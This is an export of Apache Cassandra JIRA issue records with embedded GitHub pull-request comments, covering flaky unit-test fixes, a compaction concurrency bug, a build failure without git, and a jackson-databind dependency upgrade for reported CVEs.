 
-    private void waitForConnection(OutboundConnection outboundConnection) throws InterruptedException
+    private final static Duration DELIVERY_WAIT_DURATION = Duration.ofSeconds(60);
+
+    private void confirmDelivery(OutboundConnection outboundConnection) throws InterruptedException
     {
-        long startTime = System.currentTimeMillis();
-        while (!outboundConnection.isConnected() && System.currentTimeMillis() - startTime < 60000)
+        Instant endTime = Instant.now().plus(DELIVERY_WAIT_DURATION);
+
+        while (!outboundConnection.isConnected() && Instant.now().isBefore(endTime))
         {
             Thread.sleep(1000);
         }
+
+        // Now that we're connected, we also want to ensure that the delivery thread succeeded
+        while (outboundConnection.hasPending() && Instant.now().isBefore(endTime)) {

Review Comment:
   I had made that argument in my original commit. @ekaterinadimitrova2 had pushed back and asked to also confirm delivery, so I made the change. Can you discuss in the thread and see what we can all agree on?



;09/Feb/23 20:47;githubbot;600","ekaterinadimitrova2 commented on code in PR #2143:
URL: https://github.com/apache/cassandra/pull/2143#discussion_r1102022551


##########
test/unit/org/apache/cassandra/net/HandshakeTest.java:
##########
@@ -377,24 +378,35 @@ private void testOutboundFallbackOnSSLHandshakeFailure(SslFallbackConnectionType
             InetAddressAndPort endpoint = inbound.sockets().stream().map(s -> s.settings.bindAddress).findFirst().get();
             inbound.open();
 
-            // Open outbound connections, and wait until connection is established
+            // Open outbound connections, and wait until connection is established and the initial message is delivered
             OutboundConnection outboundConnection = initiateOutbound(endpoint, fromConnectionType, fromOptional);
-            waitForConnection(outboundConnection);
-            assertTrue(outboundConnection.isConnected());
-            assertFalse(outboundConnection.hasPending());
+            confirmDelivery(outboundConnection);
         }
         finally
         {
             inbound.close().await(10L, TimeUnit.SECONDS);
         }
     }
 
-    private void waitForConnection(OutboundConnection outboundConnection) throws InterruptedException
+    private final static Duration DELIVERY_WAIT_DURATION = Duration.ofSeconds(60);
+
+    private void confirmDelivery(OutboundConnection outboundConnection) throws InterruptedException
     {
-        long startTime = System.currentTimeMillis();
-        while (!outboundConnection.isConnected() && System.currentTimeMillis() - startTime < 60000)
+        Instant endTime = Instant.now().plus(DELIVERY_WAIT_DURATION);
+
+        while (!outboundConnection.isConnected() && Instant.now().isBefore(endTime))
         {
             Thread.sleep(1000);
         }
+
+        // Now that we're connected, we also want to ensure that the delivery thread succeeded
+        while (outboundConnection.hasPending() && Instant.now().isBefore(endTime)) {

Review Comment:
   `We might be waiting indefinitely`
   @jyothsnakonisa  Can you elaborate a bit, please? I suspect I might be missing something



;09/Feb/23 21:04;githubbot;600","dchenbecker commented on PR #2143:
URL: https://github.com/apache/cassandra/pull/2143#issuecomment-1440575485

   This was merged separately, so I'm closing this PR


;22/Feb/23 18:29;githubbot;600","dchenbecker closed pull request #2143: [CASSANDRA-17979] Remove invalid handshake test assertion
URL: https://github.com/apache/cassandra/pull/2143


;22/Feb/23 18:29;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4200,,,0,4200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dchenbecker,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Feb 14 22:07:26 UTC 2023,,,,,,,All,,,,"0|z19j1s:",9223372036854775807,,,,brandon.williams,e.dimitrova,smiklosovic,,Normal,,NA,,https://github.com/apache/cassandra/commit/5e409f0bd1ab108545e617a97d367bdea46b4c86,,,,,,,,,"Tested in CircleCI and locally with multiple runs and I no longer hit the error encountered.

https://github.com/apache/cassandra/pull/2143",,,,,"03/Feb/23 22:14;dchenbecker;I'm reopening this ticket. While digging into the test failure, it appears to be a bug-in-test, and a different code path than CASSANDRA-17708;;;","03/Feb/23 22:18;dchenbecker;I think that the problem is https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/net/HandshakeTest.java#L384. The previous line calls {{isConnected}}, which only checks the state of the connection, not whether the connection has pending data. Given that the test appears to want to just test connection fallback, I think that the check for pending messages is unnecessary. I'll submit a patch to remove that check.;;;","06/Feb/23 17:50;brandon.williams;I agree with your analysis.  This only affects trunk since the test was added as part of CASSANDRA-17923.

||Branch||CI||
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17979-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/853/workflows/5439b983-4b50-41a3-9cf9-2def4f6cda00], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/853/workflows/4b689d33-6688-4c6a-9531-984ba07facc7]|
;;;","06/Feb/23 19:57;brandon.williams;We need to remove [this one|https://github.com/driftx/cassandra/commit/37ccbbef2c22fefd137275ef47dfaa1b1cf8d153] too.

||Branch||CI||
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17979-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/854/workflows/e4a4f08c-825b-4dc2-a1d0-ed20ec208e0d], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/854/workflows/234db71c-ee84-4497-a369-83be08ac3fd5]|
;;;","06/Feb/23 20:49;brandon.williams;The one failure in j8 is a circle env problem (ran OOS) and the one in j11 is CASSANDRA-18151.  +1 from me.;;;","07/Feb/23 23:54;dchenbecker;For posterity, here's a brief description of the code path and bug-in-test:

* The test calls {{initiateOutbound}} to [enqueue a message|https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/net/HandshakeTest.java#L365] and initiate the connection
*  After successful connection setup, the {{OutboundConnection}} state [is updated|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/net/OutboundConnection.java#L1131]
* {{waitForConnection}} basically [loops until the connection state is established {{OutboundConnection::isConnected}}|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/net/OutboundConnection.java#L1131]
* The unit test then [verifies that the connection is established|https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/net/HandshakeTest.java#L383] because {{waitForConnection}} can also exit due to timeout
* At this point we have verified that the connection has established successfully and performed whatever fallback handshake needed to occur, but nothing about the current state indicates whether or not the enqueued message has been sent, so the subsequent [{{hasPending}}|https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/net/HandshakeTest.java#L384] call is a race against the message delivery thread

Connection establishment, at least in my mind, means sockets connected, TLS handshake complete (if negotiated), and ready for use, but I don't think we want to conflate that state with whether or not bytes have been put on the wire;;;","08/Feb/23 11:22;smiklosovic;+1. Thanks. [~brandon.williams] I will leave committing on you.;;;","08/Feb/23 13:10;brandon.williams;I think [~edimitrova] had a concern here, is that still the case?;;;","08/Feb/23 15:11;e.dimitrova;My suggestion was to fix that assertion instead of removing it, it is a quick trivial fix. Otherwise I do not disagree with the things said here;;;","08/Feb/23 17:17;dchenbecker;I've replaced both assertions with a new method to validate delivery and I've renamed everything to make it clear that they also test delivery. CircleCI is running unit tests now. I'm going to disagree with the idea that every unit test should be an integration test (message delivery is tested in other test classes), but in the interest of fixing a flaky test we can hopefully merge this soon.;;;","14/Feb/23 21:43;dchenbecker;Still pending review. I really think we should go back to the first version of the patch. Testing for delivery just feels like conflating concerns in a unit test;;;","14/Feb/23 21:58;e.dimitrova;I haven’t forgotten, there was just a discussion on github with the original author and I didn’t get response?

I guess the original patch should be also fine. I am out today and on the phone, but I can commit the fix tomorrow if no one gets to it before me or has anything to say/ask;;;","14/Feb/23 22:07;brandon.williams;I still had the branch so committing was simple.  Thanks folks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CME in STCS/DTCS/TWCS.getSSTables,CASSANDRA-17977,13487206,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,marcuse,marcuse,20/Oct/22 06:16,23/Dec/22 14:04,13/Jul/23 08:40,23/Dec/22 14:04,4.0.8,4.1.1,5.0,,,,Local/Compaction,,,,0,,This method should be synchronized to avoid ConcurrentModificationException,,aleksey,marcuse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Dec 23 14:04:35 UTC 2022,,,,,,,All,,,,"0|z19it4:",9223372036854775807,,,,aleksey,,,,Low,,4.0,,https://github.com/apache/cassandra/commit/ee266d283e740785817d7cb6749e6c135f4aacbb,,,,,,,,,cci run,,,,,"20/Oct/22 06:28;marcuse;trunk: 
https://github.com/apache/cassandra/pull/1933
https://app.circleci.com/pipelines/github/krummas/cassandra/830/workflows/505cdf1c-f920-4f3f-8ff2-b324fa2804b4
4.1:
https://github.com/apache/cassandra/pull/1932
https://app.circleci.com/pipelines/github/krummas/cassandra/831/workflows/0afe0d04-c953-4cbb-9d00-723b959b7b4e
4.0:
https://github.com/apache/cassandra/pull/1934
https://app.circleci.com/pipelines/github/krummas/cassandra/832/workflows/d25fd0a5-4b5e-4e40-9bfa-f0a6fbd661d5
;;;","15/Dec/22 16:17;aleksey;+1;;;","23/Dec/22 14:04;marcuse;and committed, thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SSTableIdGenerationTest.testRestartWithUUIDDisabled fails on trunk after CASSANDRA-17948,CASSANDRA-17975,13487134,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,stefan.miklosovic,e.dimitrova,e.dimitrova,19/Oct/22 16:56,20/Oct/22 18:54,13/Jul/23 08:40,20/Oct/22 10:59,5.0,,,,,,CI,,,,0,,"The test is failing consistently on trunk after CASSANDRA-17948

CC [~stefan.miklosovic] and [~brandon.williams] 

[https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-trunk/trunk]
{code:java}
junit.framework.AssertionFailedError: Forked Java VM exited abnormally. Please note the time in the report does not reflect the time until the VM exit. at java.util.Vector.forEach(Vector.java:1277) at java.util.Vector.forEach(Vector.java:1277) at java.util.Vector.forEach(Vector.java:1277) at org.apache.cassandra.anttasks.TestHelper.execute(TestHelper.java:53) at java.util.Vector.forEach(Vector.java:1277)
{code}
 ",,brandon.williams,e.dimitrova,smiklosovic,,,,,,,,,,,,"smiklosovic opened a new pull request, #1930:
URL: https://github.com/apache/cassandra/pull/1930

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;19/Oct/22 20:01;githubbot;600","smiklosovic closed pull request #1930: CASSANDRA-17975
URL: https://github.com/apache/cassandra/pull/1930


;20/Oct/22 18:54;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,CASSANDRA-17948,,,,,,,,,,,,,,,,,,,,CASSANDRA-17873,,,,,,,,,,,,0.0,stefan.miklosovic,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Oct 20 10:52:14 UTC 2022,,,,,,,All,,,,"0|z19idc:",9223372036854775807,,,,brandon.williams,smiklosovic,,,Normal,,NA,,https://github.com/instaclustr/cassandra/commit/ac68f24512dc123a197cf49e9116afcfa3f786f9,,,,,,,,,fixed dtests ,,,,,"19/Oct/22 18:17;brandon.williams;Indeed this failed in CI but it looked environmental.  The test is expecting the jvm to crash, which can be seen before this commit:

{quote}
[junit-timeout] ERROR 18:09:37 Exception in thread Thread[node1_isolatedExecutor:1,5,isolatedExecutor]
[junit-timeout] java.lang.RuntimeException: org.apache.cassandra.tools.SystemExitException
[junit-timeout]         at org.apache.cassandra.distributed.impl.Instance.lambda$startup$12(Instance.java:734)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71)
[junit-timeout]         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
[junit-timeout]         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
[junit-timeout]         at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout]         at java.lang.Thread.run(Thread.java:750)
[junit-timeout] Caused by: org.apache.cassandra.tools.SystemExitException: null
[junit-timeout]         at org.apache.cassandra.distributed.shared.ClusterUtils$1.checkExit(ClusterUtils.java:925)
[junit-timeout]         at java.lang.Runtime.exit(Runtime.java:107)
[junit-timeout]         at java.lang.System.exit(System.java:973)
[junit-timeout]         at org.apache.cassandra.service.CassandraDaemon.exitOrFail(CassandraDaemon.java:902)
[junit-timeout]         at org.apache.cassandra.service.CassandraDaemon.runStartupChecks(CassandraDaemon.java:494)
[junit-timeout]         at org.apache.cassandra.distributed.impl.Instance.lambda$startup$12(Instance.java:598)
[junit-timeout]         ... 7 common frames omitted
[junit-timeout] ERROR [node1_isolatedExecutor:1] node1 2022-10-19 13:09:37,360 JVMStabilityInspector.java:68 - Exception in thread Thread[node1_isolatedExecutor:1,5,isolatedExecutor]
[junit-timeout] java.lang.RuntimeException: org.apache.cassandra.tools.SystemExitException
[junit-timeout]         at org.apache.cassandra.distributed.impl.Instance.lambda$startup$12(Instance.java:734)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61)
[junit-timeout]         at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71)
[junit-timeout]         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
[junit-timeout]         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
[junit-timeout]         at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout]         at java.lang.Thread.run(Thread.java:750)
[junit-timeout] Caused by: org.apache.cassandra.tools.SystemExitException: null
[junit-timeout]         at org.apache.cassandra.distributed.shared.ClusterUtils$1.checkExit(ClusterUtils.java:925)
[junit-timeout]         at java.lang.Runtime.exit(Runtime.java:107)
[junit-timeout]         at java.lang.System.exit(System.java:973)
[junit-timeout]         at org.apache.cassandra.service.CassandraDaemon.exitOrFail(CassandraDaemon.java:902)
[junit-timeout]         at org.apache.cassandra.service.CassandraDaemon.runStartupChecks(CassandraDaemon.java:494)
[junit-timeout]         at org.apache.cassandra.distributed.impl.Instance.lambda$startup$12(Instance.java:598)
[junit-timeout]         ... 7 common frames omitted
[junit-timeout] DEBUG [node1_isolatedExecutor:1] node1 2022-10-19 13:09:37,364 HeapUtils.java:134 - Heap dump creation on uncaught exceptions is disabled.
[junit-timeout] DEBUG [node1_isolatedExecutor:1] node1 2022-10-19 13:09:37,364 HeapUtils.java:134 - Heap dump creation on uncaught exceptions is disabled.

BUILD SUCCESSFUL
{quote}

and now we are crashing hard:

{quote}
[junit-timeout] Testcase: org.apache.cassandra.distributed.test.SSTableIdGenerationTest:testRestartWithUUIDDisabled:    Caused an ERROR
[junit-timeout] Forked Java VM exited abnormally. Please note the time in the report does not reflect the time until the VM exit.
[junit-timeout] junit.framework.AssertionFailedError: Forked Java VM exited abnormally. Please note the time in the report does not reflect the time until the VM exit.
[junit-timeout]         at java.util.Vector.forEach(Vector.java:1277)
[junit-timeout]         at java.util.Vector.forEach(Vector.java:1277)
[junit-timeout] 
[junit-timeout] 
[junit-timeout] Test org.apache.cassandra.distributed.test.SSTableIdGenerationTest FAILED (crashed)

BUILD FAILED
{quote};;;","19/Oct/22 18:25;e.dimitrova;Yup, I have the same impression. But I am not familiar with the patch you were working on so I have no clue about what happened. I am sure [~stefan.miklosovic] will figure it out when he sees it :) ;;;","19/Oct/22 18:59;brandon.williams;I suspected [this line|https://github.com/apache/cassandra/blob/trunk/test/distributed/org/apache/cassandra/distributed/impl/Instance.java#L594] and can confirm that it is the culprit.  I'll leave you to decide where to go from there, Stefan.;;;","19/Oct/22 19:03;smiklosovic;wow, crazy, no worries, lets take a closer look;;;","19/Oct/22 20:04;smiklosovic;This should do it https://github.com/apache/cassandra/pull/1930/commits/7a6186587b7f3dc51fbcc4449b6b1a8593558e9c
Running the build here: https://app.circleci.com/pipelines/github/instaclustr/cassandra/1459/workflows/6f667545-acaf-4143-99f3-e381675a5e99;;;","19/Oct/22 20:08;brandon.williams;LGTM, but we should 500x this test to be certain.;;;","20/Oct/22 08:45;smiklosovic;500x for both tests (the failing one and one added by the ticket which introduced this error) is here (1)

j8 precommit (2) repeats were triggered there as well but it timeouted as it took longer than 1h otherwise whole build is ok
j11 precommit (3) there is one failing junit, it is in Butler already but there seem to be no ticket for it, I ll create one.

(1) https://app.circleci.com/pipelines/github/instaclustr/cassandra/1466/workflows/3b6282d9-e50d-4745-80b3-39bcbeebce56/jobs/6285
(2) https://app.circleci.com/pipelines/github/instaclustr/cassandra/1466/workflows/e7683fc3-535e-400d-b531-035270404dd5
(3) https://app.circleci.com/pipelines/github/instaclustr/cassandra/1466/workflows/ffb52616-92d7-4089-a0c9-a9ebf28333c0
;;;","20/Oct/22 10:52;brandon.williams;I created CASSANDRA-17979 for the failing testOutboundConnectionfFallbackDuringUpgrades test.  Everything else looks good, +1.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
running Ant rat targets without git fails,CASSANDRA-17974,13487065,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,smiklosovic,smiklosovic,19/Oct/22 11:51,23/Oct/22 21:17,13/Jul/23 08:40,21/Oct/22 08:24,3.0.29,3.11.15,4.0.8,4.1,4.1-rc1,5.0,Build,,,,0,,"This was detected while reviewing CASSANDRA-17753

When trying it build without git command, I am getting this:

{code}
_rat_init:

_build_ratinclude:
    [exec] Execute failed: java.io.IOException: Cannot run program ""git"" (in directory ""/home/smiklosovic/test/cassandra-CASSANDRA-17753""): error=2, No such file or directory
    
BUILD FAILED
/home/smiklosovic/test/cassandra-CASSANDRA-17753/.build/build-rat.xml:38: ""Warning: Could not find file /home/smiklosovic/test/cassandra-CASSANDRA-17753/build/.versioned_files to copy
{code}

This was ran on a system without Git and against code downloaded from Github in a zip file.",,mck,smiklosovic,,,,,,,,,,,,,"smiklosovic opened a new pull request, #1926:
URL: https://github.com/apache/cassandra/pull/1926

   patch by Stefan Miklosovic; reviewed by TBD for CASSANDRA-17974
   
   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;19/Oct/22 12:01;githubbot;600","smiklosovic closed pull request #1926: CASSANDRA-17974 fix running Ant rat targets without git
URL: https://github.com/apache/cassandra/pull/1926


;21/Oct/22 10:05;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,CASSANDRA-17753,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Packaging -> Source Distribution,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Oct 21 08:24:46 UTC 2022,,,,,,,All,,,,"0|z19hy0:",9223372036854775807,,,,mck,,,,Normal,,3.0.25,,https://github.com/apache/cassandra/commit/2b31675fbd2fa217d864f314536dc15eea082638,,,,,,,,,ci build and manual test without git present,,,,,"19/Oct/22 11:53;smiklosovic;It seems to me that this problem exists across all versions we support, .build/build-rat.xml is same everywhere;;;","19/Oct/22 12:02;smiklosovic;patch for 3.0 is here, https://github.com/apache/cassandra/pull/1926
build is in progress here: https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2022/;;;","19/Oct/22 12:15;brandon.williams;/cc [~mck];;;","19/Oct/22 13:33;smiklosovic;We agreed offline with [~mck] that this is not a blocker for releases we are trying to ship right now so the current voting is still in progress. I will finish all builds for all branches and we might just merge it.;;;","20/Oct/22 07:28;mck;+1;;;","20/Oct/22 12:37;smiklosovic;3.0 https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2028/;;;","20/Oct/22 13:50;smiklosovic;I have tested it manually for all other branches. I consider that to be actually better than CI as we currently can not mimic what happens when git executable is not present.;;;","21/Oct/22 08:24;smiklosovic;I will fix ""Fix Version/s"" when we have tags for new yet-unreleased versions and the deal here is that this wont go to 3.0.28 and similar yet.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Avoid anticompaction mixing data from two different time windows with TWCS,CASSANDRA-17970,13486766,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,marcuse,marcuse,18/Oct/22 06:31,23/Dec/22 13:55,13/Jul/23 08:40,23/Dec/22 13:55,3.0.29,3.11.15,4.0.8,4.1.1,5.0,,Local/Compaction/TWCS,,,,0,,When grouping sstables for anticompaction we can currently get sstables from different time windows when running TWCS,,aleksey,marcuse,,,,,,,,,,,,,"krummas opened a new pull request, #1922:
URL: https://github.com/apache/cassandra/pull/1922

   Avoid TWCS mixing sstables from different time windows during anticompaction
   
   patch by marcuse; reviewed by <Reviewers> for CASSANDRA-17970


;18/Oct/22 13:28;githubbot;600","krummas opened a new pull request, #1923:
URL: https://github.com/apache/cassandra/pull/1923

   Avoid TWCS mixing sstables from different time windows during anticompaction
   
   patch by marcuse; reviewed by <Reviewers> for CASSANDRA-17970


;18/Oct/22 13:28;githubbot;600","krummas opened a new pull request, #1924:
URL: https://github.com/apache/cassandra/pull/1924

   Avoid TWCS mixing sstables from different time windows during anticompaction
   
   patch by marcuse; reviewed by <Reviewers> for CASSANDRA-17970


;18/Oct/22 13:29;githubbot;600","iamaleksey commented on code in PR #1922:
URL: https://github.com/apache/cassandra/pull/1922#discussion_r1053256991


##########
test/unit/org/apache/cassandra/db/compaction/TimeWindowCompactionStrategyTest.java:
##########
@@ -370,4 +373,25 @@ public void testDropOverlappingExpiredSSTables() throws InterruptedException
         twcs.shutdown();
         t.transaction.abort();
     }
+
+    @Test
+    public void testGroupForAntiCompaction()
+    {
+        ColumnFamilyStore cfs = MockSchema.newCFS(""test_group_for_anticompaction"");
+        cfs.setCompactionParameters(ImmutableMap.of(""class"", ""TimeWindowCompactionStrategy"",
+                                                    ""timestamp_resolution"", ""MILLISECONDS"",
+                                                    ""compaction_window_size"", ""1"",
+                                                    ""compaction_window_unit"", ""MINUTES""));
+
+        List<SSTableReader> sstables = new ArrayList<>(10);
+        long curr = System.currentTimeMillis();
+        for (int i = 0; i < 10; i++)
+            sstables.add(MockSchema.sstableWithTimestamp(i, curr + TimeUnit.MILLISECONDS.convert(i, TimeUnit.MINUTES), cfs));
+
+        cfs.addSSTables(sstables);
+        Collection<Collection<SSTableReader>> groups = cfs.getCompactionStrategyManager().getCompactionStrategyFor(sstables.get(0)).groupSSTablesForAntiCompaction(sstables);
+        assertFalse(groups.isEmpty());

Review Comment:
   Might as well replace this assert with `size() == 0` I think.



;20/Dec/22 12:22;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Degradation -> Performance Bug/Regression,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Dec 23 13:55:08 UTC 2022,,,,,,,All,,,,"0|z19g60:",9223372036854775807,,,,aleksey,,,,Low,,3.0 alpha 1,,https://github.com/apache/cassandra/commit/730b898b7415e568138c6fc1e961f69b41ba1fa0,,,,,,,,,new test + cci run,,,,,"18/Oct/22 13:31;marcuse;trunk:
https://github.com/apache/cassandra/pull/1924
https://app.circleci.com/pipelines/github/krummas/cassandra/823/workflows/b8433e4b-9510-4ff0-baf5-e76d303f6e0f

4.1:
https://github.com/apache/cassandra/pull/1923
https://app.circleci.com/pipelines/github/krummas/cassandra/825/workflows/e93b3bc8-188d-4328-a0b7-dab8979754e4

4.0:
https://github.com/apache/cassandra/pull/1922
https://app.circleci.com/pipelines/github/krummas/cassandra/824/workflows/e4454540-e7b7-4aef-8b24-9b641e363cb7
;;;","20/Dec/22 12:24;aleksey;+1, with one ignorable test nit in PR comments.;;;","23/Dec/22 13:55;marcuse;and committed, thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jackson-databind vulnerability CVE-2022-42003 CVE-2022-42004,CASSANDRA-17966,13486649,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,17/Oct/22 14:55,06/Jul/23 18:50,13/Jul/23 08:40,18/Oct/22 15:40,3.11.14,4.0.7,4.1-rc1,5.0,,,Dependencies,,,,0,,"As the summary says, jackson-databind 2.13.2.2 which was upgraded for a vulnerability in CASSANDRA-17556 is vulnerable again.",,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18081,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Oct 18 15:40:32 UTC 2022,,,,,,,All,,,,"0|z19fg0:",9223372036854775807,,,,stefan.miklosovic,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/2e6528542b21a5d79eeba6d22ddc2a289805f98c,,,,,,,,,run 